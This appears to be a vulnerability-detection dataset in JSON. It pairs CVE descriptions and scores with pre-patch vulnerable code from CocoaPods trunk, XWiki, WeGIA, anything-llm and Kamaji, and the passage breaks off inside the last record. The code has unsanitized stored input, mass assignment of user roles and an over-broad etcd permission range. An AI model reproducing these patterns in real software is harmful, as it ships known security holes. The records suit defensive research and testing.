[
  {
    "id": 907,
    "cve": "CVE-2024-38368",
    "description": "trunk.cocoapods.org is the authentication server for the CoacoaPods dependency manager. A vulnerability affected older pods which migrated from the pre-2014 pull request workflow to trunk. If the pods had never been claimed then it was still possible to do so. It was also possible to have all owners removed from a pod, and that made the pod available for the same claiming system. This was patched server-side in commit 71be5440906b6bdfbc0bcc7f8a9fec33367ea0f4 in September 2023.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/controllers/claims_controller.rb",
          "content": "require 'app/controllers/app_controller'\nrequire 'app/models/dispute'\nrequire 'app/controllers/slack_controller'\n\nrequire 'active_support/core_ext/object/to_query'\nrequire 'sinatra/twitter-bootstrap'\nrequire 'slim'\nrequire 'rest'\n\nmodule Pod\n  module TrunkApp\n    class ClaimsController < HTMLController\n      configure do\n        set :views, settings.root + '/app/views/claims'\n      end\n\n      configure :development do\n        register Sinatra::Reloader\n      end\n\n      def shared_partial(*sources)\n        sources.inject([]) do |combined, source|\n          combined << Slim::Template.new(\"shared/includes/_#{source}.slim\", {}).render\n        end.join\n      end\n\n      # --- Claims --------------------------------------------------------------------------------\n\n      get '/new' do\n        @owner = Owner.new\n        @pods = []\n        slim :new\n      end\n\n      post '/' do\n        find_owner\n        find_pods\n        if @owner.valid? && valid_pods?\n          change_ownership\n          if all_pods_already_claimed?\n            query = {\n              :claimer_email => @owner.email,\n              :pods => @already_claimed_pods,\n            }\n            redirect to(\"/disputes/new?#{query.to_query}\")\n          else\n            query = {\n              :claimer_email => @owner.email,\n              :successfully_claimed => @successfully_claimed_pods,\n              :already_claimed => @already_claimed_pods,\n            }\n            redirect to(\"/thanks?#{query.to_query}\")\n          end\n        end\n        prepare_errors\n        slim :new\n      end\n\n      get '/thanks' do\n        slim :thanks\n      end\n\n      # --- Disputes ------------------------------------------------------------------------------\n\n      get '/disputes/new' do\n        @pods = params[:pods].map { |name| Pod.find_by_name(name) }\n        slim :'disputes/new'\n      end\n\n      post '/disputes' do\n        claimer = Owner.find_by_email(params[:dispute][:claimer_email])\n        dispute = Dispute.create(:claimer => claimer, :message => params[:dispute][:message])\n        SlackController.notify_slack_of_new_dispute(dispute)\n        redirect to('/disputes/thanks')\n      end\n\n      get '/disputes/thanks' do\n        slim :'disputes/thanks'\n      end\n\n      # --- Assets ------------------------------------------------------------------------------\n\n      get '/claims.css' do\n        scss :claims, :style => :expanded\n      end\n\n      private\n\n      def find_owner\n        owner_email, owner_name = params[:owner].values_at('email', 'name')\n        @owner = Owner.find_or_initialize_by_email_and_name(owner_email, owner_name)\n      end\n\n      def find_pods\n        @pods = []\n        @invalid_pods = []\n        unless params[:pods].blank?\n          params[:pods].map(&:strip).uniq.each do |pod_name|\n            next if pod_name.blank?\n\n            if pod = Pod.find_by_name(pod_name)\n              @pods << pod\n            else\n              @invalid_pods << pod_name\n            end\n          end\n        end\n      end\n\n      def valid_pods?\n        !@pods.empty? && @invalid_pods.empty?\n      end\n\n      def all_pods_already_claimed?\n        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?\n      end\n\n      def prepare_errors\n        @errors = @owner.errors.full_messages.map { |message| \"Owner #{message}.\" }\n        if !@invalid_pods.empty?\n          @errors << \"Unknown #{'Pod'.pluralize(@invalid_pods.size)} #{@invalid_pods.to_sentence}.\"\n        elsif @pods.empty?\n          @errors << 'No Pods specified.'\n        end\n      end\n\n      def change_ownership\n        @successfully_claimed_pods = []\n        @already_claimed_pods = []\n        DB.test_safe_transaction do\n          @owner.save_changes(:raise_on_save_failure => true)\n          unclaimed_owner = Owner.unclaimed\n          @pods.each do |pod|\n            if pod.owners == [unclaimed_owner]\n              @owner.add_pod(pod)\n              pod.remove_owner(unclaimed_owner)\n              @successfully_claimed_pods << pod.name\n            else\n              @already_claimed_pods << pod.name\n            end\n          end\n        end\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def all_pods_already_claimed?\n        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?\n      end",
        "def change_ownership\n        @successfully_claimed_pods = []\n        @already_claimed_pods = []\n        DB.test_safe_transaction do\n          @owner.save_changes(:raise_on_save_failure => true)\n          unclaimed_owner = Owner.unclaimed\n          @pods.each do |pod|\n            if pod.owners == [unclaimed_owner]\n              @owner.add_pod(pod)\n              pod.remove_owner(unclaimed_owner)\n              @successfully_claimed_pods << pod.name\n            else\n              @already_claimed_pods << pod.name\n            end\n          end\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 114,
          "content": "      def all_pods_already_claimed?"
        },
        {
          "line_no": 115,
          "content": "        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?"
        },
        {
          "line_no": 116,
          "content": "      end"
        },
        {
          "line_no": 127,
          "content": "      def change_ownership"
        },
        {
          "line_no": 128,
          "content": "        @successfully_claimed_pods = []"
        },
        {
          "line_no": 129,
          "content": "        @already_claimed_pods = []"
        },
        {
          "line_no": 130,
          "content": "        DB.test_safe_transaction do"
        },
        {
          "line_no": 131,
          "content": "          @owner.save_changes(:raise_on_save_failure => true)"
        },
        {
          "line_no": 132,
          "content": "          unclaimed_owner = Owner.unclaimed"
        },
        {
          "line_no": 133,
          "content": "          @pods.each do |pod|"
        },
        {
          "line_no": 134,
          "content": "            if pod.owners == [unclaimed_owner]"
        },
        {
          "line_no": 135,
          "content": "              @owner.add_pod(pod)"
        },
        {
          "line_no": 136,
          "content": "              pod.remove_owner(unclaimed_owner)"
        },
        {
          "line_no": 137,
          "content": "              @successfully_claimed_pods << pod.name"
        },
        {
          "line_no": 138,
          "content": "            else"
        },
        {
          "line_no": 139,
          "content": "              @already_claimed_pods << pod.name"
        },
        {
          "line_no": 140,
          "content": "            end"
        },
        {
          "line_no": 141,
          "content": "          end"
        },
        {
          "line_no": 142,
          "content": "        end"
        },
        {
          "line_no": 143,
          "content": "      end"
        }
      ]
    },
    "cwe": [
      "CWE-668"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.3,
    "cvss_version": 3.1
  },
  {
    "id": 613,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 8,
    "cve": "CVE-2025-23037",
    "description": "WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. A Stored Cross-Site Scripting (XSS) vulnerability was identified in the `control.php` endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts into the `cargo` parameter. The injected scripts are stored on the server and executed automatically whenever the affected page is accessed by users, posing a significant security risk. The application fails to properly validate and sanitize user inputs in the `control.php` parameter. This lack of validation allows attackers to inject malicious scripts, which are then stored on the server. Whenever the affected page is accessed, the malicious payload is executed in the victim's browser, potentially compromising the user's data and system. This issue has been addressed in version 3.2.6. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "controle/CargoControle.php",
          "content": "<?php\n\nrequire_once '../classes/Cargo.php';\nrequire_once '../dao/CargoDAO.php';\n\nclass CargoControle {\n    public function incluir() {\n    \n        // Determina se os dados foram enviados via JSON\n        if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {\n            // Recebe o JSON da requisição\n            $json = file_get_contents('php://input');\n            // Decodifica o JSON\n            $data = json_decode($json, true);\n\n            $cargoDescricao = trim($data[\"cargo\"]);\n        } else {\n            // Recebe os dados do formulário normalmente\n            $cargoDescricao = trim($_POST[\"cargo\"]);\n        }\n\n        try {\n            $cargo = new Cargo((string)($cargoDescricao));\n        } catch (InvalidArgumentException $e) {\n            echo 'Erro ao adicionar cargo: ' . $e->getMessage();\n            return;\n        }\n\n        if ($cargo) {\n            $cargoDAO = new CargoDAO();\n            $cargoDAO->incluir($cargo);\n        }\n    }\n\n    public function listarTodos() {\n        $cargosArray = [];\n\n        $cargoDAO = new CargoDAO();\n        $cargos = $cargoDAO->listarTodos();\n\n        foreach ($cargos as $cargo) {\n            $cargosArray[] = ['id_cargo' => $cargo->getId_cargo(), 'cargo' => $cargo->getCargo()];\n        }\n\n        $cargosJSON = json_encode($cargosArray);\n        echo $cargosJSON;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function incluir() {\n    \n        // Determina se os dados foram enviados via JSON\n        if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {\n            // Recebe o JSON da requisição\n            $json = file_get_contents('php://input');\n            // Decodifica o JSON\n            $data = json_decode($json, true);\n\n            $cargoDescricao = trim($data[\"cargo\"]);\n        } else {\n            // Recebe os dados do formulário normalmente\n            $cargoDescricao = trim($_POST[\"cargo\"]);\n        }\n\n        try {\n            $cargo = new Cargo((string)($cargoDescricao));\n        } catch (InvalidArgumentException $e) {\n            echo 'Erro ao adicionar cargo: ' . $e->getMessage();\n            return;\n        }\n\n        if ($cargo) {\n            $cargoDAO = new CargoDAO();\n            $cargoDAO->incluir($cargo);\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 16,
          "content": "            $cargoDescricao = trim($data[\"cargo\"]);"
        },
        {
          "line_no": 19,
          "content": "            $cargoDescricao = trim($_POST[\"cargo\"]);"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 4.0
  },
  {
    "id": 649,
    "cve": "CVE-2024-0404",
    "description": "A mass assignment vulnerability exists in the `/api/invite/:code` endpoint of the mintplex-labs/anything-llm repository, allowing unauthorized creation of high-privileged accounts. By intercepting and modifying the HTTP request during the account creation process via an invitation link, an attacker can add a `role` property with `admin` value, thereby gaining administrative access. This issue arises due to the lack of property allowlisting and blocklisting, enabling the attacker to exploit the system and perform actions as an administrator.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/endpoints/invite.js",
          "content": "const { Invite } = require(\"../models/invite\");\nconst { User } = require(\"../models/user\");\nconst { reqBody } = require(\"../utils/http\");\n\nfunction inviteEndpoints(app) {\n  if (!app) return;\n\n  app.get(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const invite = await Invite.get({ code });\n      if (!invite) {\n        response.status(200).json({ invite: null, error: \"Invite not found.\" });\n        return;\n      }\n\n      if (invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ invite: null, error: \"Invite is no longer valid.\" });\n        return;\n      }\n\n      response\n        .status(200)\n        .json({ invite: { code, status: invite.status }, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n\n  app.post(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const userParams = reqBody(request);\n      const invite = await Invite.get({ code });\n      if (!invite || invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ success: false, error: \"Invite not found or is invalid.\" });\n        return;\n      }\n\n      const { user, error } = await User.create(userParams);\n      if (!user) {\n        console.error(\"Accepting invite:\", error);\n        response\n          .status(200)\n          .json({ success: false, error: \"Could not create user.\" });\n        return;\n      }\n\n      await Invite.markClaimed(invite.id, user);\n      response.status(200).json({ success: true, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n}\n\nmodule.exports = { inviteEndpoints };\n"
        }
      ],
      "method_level": [
        "function inviteEndpoints(app) {\n  if (!app) return;\n\n  app.get(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const invite = await Invite.get({ code });\n      if (!invite) {\n        response.status(200).json({ invite: null, error: \"Invite not found.\" });\n        return;\n      }\n\n      if (invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ invite: null, error: \"Invite is no longer valid.\" });\n        return;\n      }\n\n      response\n        .status(200)\n        .json({ invite: { code, status: invite.status }, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n\n  app.post(\"/invite/:code\", async (request, response) => {\n    try {\n      const { code } = request.params;\n      const userParams = reqBody(request);\n      const invite = await Invite.get({ code });\n      if (!invite || invite.status !== \"pending\") {\n        response\n          .status(200)\n          .json({ success: false, error: \"Invite not found or is invalid.\" });\n        return;\n      }\n\n      const { user, error } = await User.create(userParams);\n      if (!user) {\n        console.error(\"Accepting invite:\", error);\n        response\n          .status(200)\n          .json({ success: false, error: \"Could not create user.\" });\n        return;\n      }\n\n      await Invite.markClaimed(invite.id, user);\n      response.status(200).json({ success: true, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n}"
      ],
      "hunk_level": [
        {
          "line_no": 36,
          "content": "      const userParams = reqBody(request);"
        },
        {
          "line_no": 45,
          "content": "      const { user, error } = await User.create(userParams);"
        }
      ]
    },
    "cwe": [
      "CWE-915"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.0
  },
  {
    "id": 1087,
    "cve": "CVE-2024-42480",
    "description": "Kamaji is the Hosted Control Plane Manager for Kubernetes. In versions 1.0.0 and earlier, Kamaji uses an \"open at the top\" range definition in RBAC for etcd roles leading to some TCPs API servers being able to read, write, and delete the data of other control planes. This vulnerability is fixed in edge-24.8.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/datastore/etcd.go",
          "content": "// Copyright 2022 Clastix Labs\n// SPDX-License-Identifier: Apache-2.0\n\npackage datastore\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\n\tgoerrors \"github.com/pkg/errors\"\n\t\"go.etcd.io/etcd/api/v3/authpb\"\n\t\"go.etcd.io/etcd/api/v3/v3rpc/rpctypes\"\n\tetcdclient \"go.etcd.io/etcd/client/v3\"\n\n\tkamajiv1alpha1 \"github.com/clastix/kamaji/api/v1alpha1\"\n\t\"github.com/clastix/kamaji/internal/datastore/errors\"\n)\n\nconst (\n\t// rangeEnd is the key following the last key of the range.\n\t// If rangeEnd is ‘\\0’, the range is all keys greater than or equal to the key argument\n\t// source: https://etcd.io/docs/v3.5/learning/api/\n\trangeEnd = \"\\\\0\"\n)\n\nfunc NewETCDConnection(config ConnectionConfig) (Connection, error) {\n\tendpoints := make([]string, 0, len(config.Endpoints))\n\n\tfor _, ep := range config.Endpoints {\n\t\tendpoints = append(endpoints, ep.String())\n\t}\n\n\tcfg := etcdclient.Config{\n\t\tEndpoints: endpoints,\n\t\tTLS:       config.TLSConfig,\n\t}\n\n\tclient, err := etcdclient.New(cfg)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &EtcdClient{\n\t\tClient: *client,\n\t}, nil\n}\n\ntype EtcdClient struct {\n\tClient etcdclient.Client\n}\n\nfunc (e *EtcdClient) CreateUser(ctx context.Context, user, password string) error {\n\tif _, err := e.Client.Auth.UserAddWithOptions(ctx, user, password, &etcdclient.UserAddOptions{NoPassword: true}); err != nil {\n\t\treturn errors.NewCreateUserError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) CreateDB(context.Context, string) error {\n\treturn nil\n}\n\nfunc (e *EtcdClient) GrantPrivileges(ctx context.Context, user, dbName string) error {\n\tif _, err := e.Client.Auth.RoleAdd(ctx, dbName); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\tpermission := etcdclient.PermissionType(authpb.READWRITE)\n\tkey := e.buildKey(dbName)\n\tif _, err := e.Client.RoleGrantPermission(ctx, user, key, rangeEnd, permission); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\tif _, err := e.Client.UserGrantRole(ctx, user, dbName); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) UserExists(ctx context.Context, user string) (bool, error) {\n\tif _, err := e.Client.UserGet(ctx, user); err != nil {\n\t\tif goerrors.As(err, &rpctypes.ErrGRPCUserNotFound) {\n\t\t\treturn false, nil\n\t\t}\n\n\t\treturn false, errors.NewCheckUserExistsError(err)\n\t}\n\n\treturn true, nil\n}\n\nfunc (e *EtcdClient) DBExists(context.Context, string) (bool, error) {\n\treturn true, nil\n}\n\nfunc (e *EtcdClient) GrantPrivilegesExists(ctx context.Context, username, dbName string) (bool, error) {\n\t_, err := e.Client.RoleGet(ctx, dbName)\n\tif err != nil {\n\t\tif goerrors.As(err, &rpctypes.ErrGRPCRoleNotFound) {\n\t\t\treturn false, nil\n\t\t}\n\n\t\treturn false, errors.NewCheckGrantExistsError(err)\n\t}\n\n\tuser, err := e.Client.UserGet(ctx, username)\n\tif err != nil {\n\t\treturn false, errors.NewCheckGrantExistsError(err)\n\t}\n\n\tfor _, i := range user.Roles {\n\t\tif i == dbName {\n\t\t\treturn true, nil\n\t\t}\n\t}\n\n\treturn false, nil\n}\n\nfunc (e *EtcdClient) DeleteUser(ctx context.Context, user string) error {\n\tif _, err := e.Client.Auth.UserDelete(ctx, user); err != nil {\n\t\treturn errors.NewDeleteUserError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) DeleteDB(ctx context.Context, dbName string) error {\n\tprefix := e.buildKey(dbName)\n\tif _, err := e.Client.Delete(ctx, prefix, etcdclient.WithPrefix()); err != nil {\n\t\treturn errors.NewCannotDeleteDatabaseError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) RevokePrivileges(ctx context.Context, _, dbName string) error {\n\tif _, err := e.Client.Auth.RoleDelete(ctx, dbName); err != nil {\n\t\treturn errors.NewRevokePrivilegesError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) GetConnectionString() string {\n\t// There's no need for connection string in etcd client:\n\t// it's not used by Kine\n\treturn \"\"\n}\n\nfunc (e *EtcdClient) Close() error {\n\tif err := e.Client.Close(); err != nil {\n\t\treturn errors.NewCloseConnectionError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) Check(ctx context.Context) error {\n\tif _, err := e.Client.AuthStatus(ctx); err != nil {\n\t\treturn errors.NewCheckConnectionError(err)\n\t}\n\n\treturn nil\n}\n\nfunc (e *EtcdClient) Driver() string {\n\treturn string(kamajiv1alpha1.EtcdDriver)\n}\n\nfunc (e *EtcdClient) buildKey(key string) string {\n\treturn fmt.Sprintf(\"/%s/\", key)\n}\n\nfunc (e *EtcdClient) Migrate(ctx context.Context, tcp kamajiv1alpha1.TenantControlPlane, target Connection) error {\n\ttargetClient := target.(*EtcdClient) //nolint:forcetypeassert\n\n\tif err := target.Check(ctx); err != nil {\n\t\treturn err\n\t}\n\n\tresponse, err := e.Client.Get(ctx, e.buildKey(fmt.Sprintf(\"%s_%s\", tcp.GetNamespace(), tcp.GetName())), etcdclient.WithRange(rangeEnd))\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfor _, kv := range response.Kvs {\n\t\tif _, err = targetClient.Client.Put(ctx, string(kv.Key), string(kv.Value)); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn nil\n}\n"
        }
      ],
      "method_level": [
